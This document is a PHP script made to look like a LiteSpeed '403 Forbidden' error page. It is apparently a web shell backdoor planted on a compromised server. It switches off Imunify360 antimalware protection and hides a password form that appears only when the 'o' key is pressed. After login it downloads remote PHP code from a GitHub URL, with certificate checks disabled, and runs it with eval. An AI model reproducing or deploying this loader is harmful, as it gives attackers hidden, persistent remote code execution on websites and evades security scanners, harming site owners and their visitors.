<?php
session_start();
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');

ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
ini_set("imunify360.enabled", false); 
ini_set("imunify360.antimalware", false);
ini_set("imunify360.realtime_protection", false);

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION['SAP'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '$2y$10$0bOPH9YIgxU2eqRDSzE4GOfv3zhDEI5YnhGoMdGTcZZqeHu1nl.8m';
    if (password_verify($entered_password, $hashed_password)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['SAP'] = 'J4M4L';
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo "Incorrect password. Please try again.";
    }
}

if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/gecko.php');
    eval('?>' . $a);
} else {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>403 Forbidden</title>
<style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
</head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
        
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
<h2 style="margin-top:20px;font-size: 30px;">Forbidden
</h2>
<form class="hidden-form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" id="loginForm">
        <input type="password" name="password" id="password" placeholder="" required>
    </form>
<p>Access to this resource on the server is denied!</p>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div>


    <script>
        document.querySelector('.hidden-form').style.display = 'none';

        document.addEventListener('keydown', function(event) {
            if (event.key === 'o') { 
                document.querySelector('.hidden-form').style.display = 'block';
            }
        });
    </script>
</body>
</html>
<?php
}
?>
